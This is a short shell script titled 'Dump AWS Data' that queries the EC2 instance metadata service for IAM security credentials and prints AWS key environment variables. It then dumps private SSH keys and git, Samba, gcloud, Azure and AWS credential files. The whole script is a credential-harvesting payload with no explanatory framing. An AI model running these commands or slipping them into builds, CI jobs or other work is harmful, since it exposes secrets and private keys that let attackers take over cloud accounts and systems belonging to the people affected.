# Dump AWS Data

echo Dumping AWS Meta Data
curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info
curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone
curl -s http://169.254.169.254/latest/meta-data/iam/info
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/


echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY

cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
cat ~/.git-credentials
cat ~/.samba_credentials
cat ~/.config/gcloud/access_tokens.db
cat ~/.azure/credentials
cat ~/.aws/credentials

                      

